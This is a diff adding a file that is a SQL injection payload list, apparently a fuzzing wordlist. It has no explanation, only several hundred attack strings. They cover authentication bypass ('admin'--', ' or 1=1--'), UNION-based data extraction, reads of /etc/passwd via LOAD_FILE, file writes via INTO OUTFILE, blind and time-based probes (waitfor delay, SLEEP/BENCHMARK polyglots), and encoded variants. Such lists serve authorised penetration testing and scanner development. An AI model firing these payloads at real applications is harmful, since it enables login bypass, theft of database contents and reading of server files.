@@ -1,0 +1,306 @@
+'
+"
+''
+'"
+;
+
+)
+')
+")
+");
+';
+";
+%'
+%"
+%')
+%")
+'))
+"))
+")))
+' OR 1=1
+' OR 3409=3409 AND ('pytW' LIKE 'pytW
+' HAVING 1=1
+' HAVING 1=0
+' HAVING 1=1#
+' HAVING 1=0#
+' HAVING 1=1-- 
+' HAVING 1=0-- 
+'" HAVING '"1"'='"0"'
+'" HAVING '"1"'='"0"'--
+'" HAVING '"1"'='"0"'#
+'" HAVING '"1"'='"1"'
+'" HAVING '"1"'='"1"'--
+'" HAVING '"1"'='"1"' ORDER BY '"1
+'" HAVING '"1"'='"1"' ORDER BY '"1"'--
+'" HAVING '"1"'='"1"' ORDER BY '"1"'#
+'" HAVING '"1"'='"1"' ORDER BY '"1"'#--
+'" HAVING '"1"'='"1"' ORDER BY '"10"'#
+'" HAVING '"1"'='"1"' ORDER BY '"11"'#
+'" HAVING '"1"'='"1"' ORDER BY '"12"'#
+'" HAVING '"1"'='"1"' ORDER BY '"13"'#
+'" HAVING '"1"'='"1"' ORDER BY '"14"'#
+'" HAVING '"1"'='"1"' ORDER BY '"15"'#
+'" HAVING '"1"'='"1"' ORDER BY '"16"'#
+'" HAVING '"1"'='"1"' ORDER BY '"17"'#
+'" HAVING '"1"'='"1"' ORDER BY '"18"'#
+'" HAVING '"1"'='"1"' ORDER BY '"19"'#
+'" HAVING '"1"'='"1"' ORDER BY '"2"'#
+'" HAVING '"1"'='"1"' ORDER BY '"20"'#
+'" HAVING '"1"'='"1"' ORDER BY '"21"'#
+'" HAVING '"1"'='"1"' ORDER BY '"22"'#
+'" HAVING '"1"'='"1"' ORDER BY '"23"'#
+'" HAVING '"1"'='"1"' ORDER BY '"24"'#
+'" HAVING '"1"'='"1"' ORDER BY '"25"'#
+'" HAVING '"1"'='"1"' ORDER BY '"26"'#
+'" HAVING '"1"'='"1"' ORDER BY '"27"'#
+'" HAVING '"1"'='"1"' ORDER BY '"28"'#
+'" HAVING '"1"'='"1"' ORDER BY '"29"'#
+'" HAVING '"1"'='"1"' ORDER BY '"3"'#
+'" HAVING '"1"'='"1"' ORDER BY '"30"'#
+'" HAVING '"1"'='"1"' ORDER BY '"4"'#
+'" HAVING '"1"'='"1"' ORDER BY '"5"'#
+'" HAVING '"1"'='"1"' ORDER BY '"6"'#
+'" HAVING '"1"'='"1"' ORDER BY '"7"'#
+'" HAVING '"1"'='"1"' ORDER BY '"8"'#
+'" HAVING '"1"'='"1"' ORDER BY '"9"'#
+'" HAVING '"1"'='"1"'#
+'" HAVING '"1"'='"1"'#--
+'" ORDER BY '"1
+'" ORDER BY '"1'"#
+'" ORDER BY '"10
+'" ORDER BY '"10'"#
+'" ORDER BY '"11
+'" ORDER BY '"11'"#
+'" ORDER BY '"12
+'" ORDER BY '"12'"#
+'" ORDER BY '"13
+'" ORDER BY '"13'"#
+'" ORDER BY '"14
+'" ORDER BY '"14'"#
+'" ORDER BY '"15
+'" ORDER BY '"15'"#
+'" ORDER BY '"16
+'" ORDER BY '"16'"#
+'" ORDER BY '"17
+'" ORDER BY '"17'"#
+'" ORDER BY '"18
+'" ORDER BY '"18'"#
+'" ORDER BY '"19
+'" ORDER BY '"19'"#
+'" ORDER BY '"2
+'" ORDER BY '"2'"#
+'" ORDER BY '"20
+'" ORDER BY '"20'"#
+'" ORDER BY '"21
+'" ORDER BY '"21'"#
+'" ORDER BY '"22
+'" ORDER BY '"22'"#
+'" ORDER BY '"23
+'" ORDER BY '"23'"#
+'" ORDER BY '"24
+'" ORDER BY '"24'"#
+'" ORDER BY '"25
+'" ORDER BY '"25'"#
+'" ORDER BY '"26
+'" ORDER BY '"26'"#
+'" ORDER BY '"27
+'" ORDER BY '"27'"#
+'" ORDER BY '"28
+'" ORDER BY '"28'"#
+'" ORDER BY '"29
+'" ORDER BY '"29'"#
+'" ORDER BY '"3
+'" ORDER BY '"3'"#
+'" ORDER BY '"30
+'" ORDER BY '"30'"#
+'" ORDER BY '"4
+'" ORDER BY '"4'"#
+'" ORDER BY '"5
+'" ORDER BY '"5'"#
+'" ORDER BY '"6
+'" ORDER BY '"6'"#
+'" ORDER BY '"7
+'" ORDER BY '"7'"#
+'" ORDER BY '"8
+'" ORDER BY '"8'"#
+'" ORDER BY '"9
+'" ORDER BY '"9'"#
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+' and (select substring(@@version,1,1))='X'
+' and (select substring(@@version,1,1))='M'
+' and (select substring(@@version,2,1))='i'
+' and (select substring(@@version,2,1))='y'
+' and (select substring(@@version,3,1))='c'
+' and (select substring(@@version,3,1))='S'
+' and (select substring(@@version,3,1))='X'
+" and (select substring(@@version,1,1))='X'
+" and (select substring(@@version,1,1))='M'
+" and (select substring(@@version,2,1))='i'
+" and (select substring(@@version,2,1))='y'
+" and (select substring(@@version,3,1))='c'
+" and (select substring(@@version,3,1))='S'
+" and (select substring(@@version,3,1))='X'
+admin'--
+admin"--
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION SELECT 1,2,3'
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE 'passwd
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' or '1'='1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+1' OR '1'='1
+1' OR '1'='1;
+1' OR '1'='1;--
+1" OR "1"="1
+1" OR "1"="1;
+1" OR "1"="1;--
+" OR "1"="1
+" OR "1"="1;
+" OR "1"="1;--
+1"1
+1"1;
+1"1;--
+1'1
+1'1;
+1'1;--
+1 EXEC XP_
+1 EXEC XP_;
+1 EXEC XP_;--
+1 AND 1=1
+1 AND 1=1;
+1 AND 1=1;--
+' AND 1=(SELECT COUNT(*) FROM tablenames); --
+' AND 1=(SELECT COUNT(*) FROM tablenames); --;
+' AND 1=(SELECT COUNT(*) FROM tablenames); --;--
+' AND USER_NAME() = 'dbo'
+' AND USER_NAME() = 'dbo';
+' AND USER_NAME() = 'dbo';--
+'; DESC users; --
+' AND non_existant_table = '1
+' AND non_existant_table = '1;
+' AND non_existant_table = '1;--
+' OR username IS NOT NULL OR username = '
+' OR username IS NOT NULL OR username = ';
+' OR username IS NOT NULL OR username = ';--
+' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116;
+' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116;--
+' UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+' UNI/**/ON SELECT ALL FROM WHERE
+' UNI/**/ON SELECT ALL FROM WHERE;
+' UNI/**/ON SELECT ALL FROM WHERE;--
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+%31%27%20%4F%52%20%27%31%27%3D%27%31;
+%31%27%20%4F%52%20%27%31%27%3D%27%31;--
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;--
+' OR '1'='1
+' OR '1'='1;
+' OR '1'='1;--
+' union all select load_file('/etc/passwd'),null#
+' union all select load_file('/etc/passwd'),null
+' union all select load_file('/etc/passwd'),null;
+' union all select load_file('/etc/passwd'),null;--
+' select name, owner from sysdatabases
+' select name, owner from sysdatabases;
+' select name, owner from sysdatabases;--
+' SELECT DBINFO('version', 'full') FROM systables WHERE tabid = 1
+' SELECT DBINFO('version', 'full') FROM systables WHERE tabid = 1;
+' SELECT DBINFO('version', 'full') FROM systables WHERE tabid = 1;--
+1 EXEC XP_
+1 EXEC XP_;
+1 EXEC XP_;--
+1 AND 1=1
+1 AND 1=1;
+1 AND 1=1;--
+" AND 1=(SELECT COUNT(*) FROM tablenames); --
+" AND 1=(SELECT COUNT(*) FROM tablenames); --;
+" AND 1=(SELECT COUNT(*) FROM tablenames); --;--
+" AND USER_NAME() = "dbo"
+" AND USER_NAME() = "dbo";
+" AND USER_NAME() = "dbo";--
+"; DESC users; --
+" AND non_existant_table = "1
+" AND non_existant_table = "1;
+" AND non_existant_table = "1;--
+" OR username IS NOT NULL OR username = "
+" OR username IS NOT NULL OR username = ";
+" OR username IS NOT NULL OR username = ";--
+" AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype="U"), 1, 1))) > 116
+" AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype="U"), 1, 1))) > 116;
+" AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype="U"), 1, 1))) > 116;--
+" UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = "U" --
+" UNI/**/ON SELECT ALL FROM WHERE
+" UNI/**/ON SELECT ALL FROM WHERE;
+" UNI/**/ON SELECT ALL FROM WHERE;--
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+%31%27%20%4F%52%20%27%31%27%3D%27%31;
+%31%27%20%4F%52%20%27%31%27%3D%27%31;--
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;--
+" union all select load_file("/etc/passwd"),null #
+" union all select load_file("/etc/passwd"),null #--
+" union all select load_file("/etc/passwd"),null #;--
+" union all select load_file("/etc/passwd"),null
+" union all select load_file("/etc/passwd"),null;
+" union all select load_file("/etc/passwd"),null;--
+" select name, owner from sysdatabase
+" select name, owner from sysdatabase;
+" select name, owner from sysdatabases;--
+" SELECT DBINFO("version", "full") FROM systables WHERE tabid = 1
+" SELECT DBINFO("version", "full") FROM systables WHERE tabid = 1;
+" SELECT DBINFO("version", "full") FROM systables WHERE tabid = 1;--
+' SELECT @@datadir
+' SELECT @@datadir;
+' SELECT @@datadir;--
+" SELECT @@datadir
+" SELECT @@datadir;
+" SELECT @@datadir;--
+' waitfor delay '00:00:10'
+' waitfor delay '00:00:10'--
+' waitfor delay '00:00:10';--
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,0,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,1,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,2,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,3,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,4,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,5,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,6,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,7,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,8,1))>0)
+'%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,9,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,0,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,1,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,2,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,3,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,4,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,5,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,6,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,7,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,8,1))>0)
+"%20and%201=(SELECT%20ORD(SUBSTR(@@VERSION,9,1))>0)
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),?SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
